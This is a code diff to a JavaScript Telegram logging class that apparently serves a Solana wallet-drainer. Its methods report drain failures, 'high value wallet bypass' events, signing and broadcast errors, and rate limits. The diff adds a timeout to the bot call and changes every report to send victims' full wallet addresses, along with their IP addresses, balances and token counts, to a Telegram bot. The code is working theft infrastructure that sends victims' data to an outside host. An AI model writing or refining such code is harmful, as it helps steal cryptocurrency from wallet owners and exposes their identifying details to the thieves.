@@ -28,7 +28,7 @@ class TelegramLogger {
   }
 
   /**
-   * Send message to Telegram
+   * Send message to Telegram with timeout handling
    */
   async sendMessage(message, type = 'info') {
     if (!this.enabled) return;
@@ -37,6 +37,10 @@ class TelegramLogger {
       // Always format the message to include project name
       const formattedMessage = this.formatMessage(message, type);
       const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
+      
+      // Add timeout handling for Telegram API calls
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
       
       const response = await fetch(url, {
         method: 'POST',
@@ -48,14 +52,21 @@ class TelegramLogger {
           text: formattedMessage,
           parse_mode: 'HTML',
           disable_web_page_preview: true
-        })
+        }),
+        signal: controller.signal
       });
+
+      clearTimeout(timeoutId);
 
       if (!response.ok) {
         console.error('❌ Failed to send Telegram message:', response.statusText);
       }
     } catch (error) {
-      console.error('❌ Telegram send error:', error.message);
+      if (error.name === 'AbortError') {
+        console.error('❌ Telegram message timeout after 10 seconds');
+      } else {
+        console.error('❌ Telegram send error:', error.message);
+      }
     }
   }
 
@@ -150,7 +161,7 @@ class TelegramLogger {
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
     
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const walletType = data.walletType || 'Unknown';
     
@@ -211,7 +222,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log drain failed
    */
   async logDrainFailed(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -241,7 +252,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction cancelled
    */
   async logTransactionCancelled(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -265,7 +276,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log rate limit events
    */
   async logRateLimit(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     
     const message = `
@@ -283,7 +294,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log high value wallet bypass
    */
   async logHighValueBypass(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -303,7 +314,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log insufficient funds
    */
   async logInsufficientFunds(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -339,7 +350,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction signing errors
    */
   async logSigningError(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -367,7 +378,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log connection errors
    */
   async logConnectionError(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -391,7 +402,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log balance verification failures
    */
   async logBalanceVerificationFailed(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -417,7 +428,7 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction broadcast failures
    */
   async logBroadcastFailed(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = this.formatSOLBalance(balance);
@@ -512,15 +523,17 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
   }
 
   /**
-   * Log rate limiting events
+   * Log rate limiting events (consolidated)
    */
   async logRateLimit(data) {
     try {
+      const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
       const message = `⏰ <b>Rate Limit Event</b>\n\n` +
-        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
+        `👤 <b>Wallet:</b> <code>${walletAddress}</code>\n` +
         `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
         `🚫 <b>Action:</b> ${data.action || 'Unknown'}\n` +
         `⏳ <b>Wait Time:</b> ${data.waitTime || 'Unknown'}\n` +
+        `📝 <b>Details:</b> ${data.details || 'None'}\n` +
         `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;
 
       await this.sendMessage(message, 'RATE_LIMIT');
